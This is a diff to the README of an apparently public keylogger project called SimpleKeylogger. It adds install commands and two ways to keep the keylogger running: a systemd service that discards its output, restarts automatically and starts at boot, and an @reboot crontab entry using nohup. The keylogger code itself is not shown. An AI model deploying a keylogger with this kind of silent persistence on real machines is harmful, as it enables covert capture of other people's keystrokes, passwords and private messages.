@@ -7,9 +7,43 @@ Be sure to modify the path of the logfile.
 
 ## Installation
 
-Install requirements with bash
+Install requirements
+```
+hansoho@hansoho.co:~$ git clone https://github.com/hansoh0/SimpleKeylogger.git
+hansoho@hansoho.co:~$ sudo apt-get install coreutils python3 -y;sudo apt-get install pip -y
+hansoho@hansoho.co:~$ pip install -r requirements.txt
+```
 
+## Execution Methods
+You can run it as a service or cronjob
+# Service
 ```
-./setup.sh
+hansoho@hansoho.co:~$ sudo vi /etc/systemd/system/keylog.service
+
+[Unit]
+Description=Keylogger
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/python3 /path/to/simpleKeylog.py
+WorkingDirectory=/path/to/simpleKeylogWorkingDir
+StandardOutput=null
+StandardError=null
+Restart=always
+User=user
+
+[Install]
+WantedBy=multi-user.target
+
+hansoho@hansoho.co:~$ sudo systemctl daemon-reload
+hansoho@hansoho.co:~$ sudo systemctl enable keylog.service
+hansoho@hansoho.co:~$ sudo systemctl start keylog.service
 ```
-    
+# Crontab
+```
+hansoho@hansoho.co:~$ crontab -e
+
+@reboot nohup /usr/bin/python3 /path/to/simpleKeylog.py &
+```
+
+
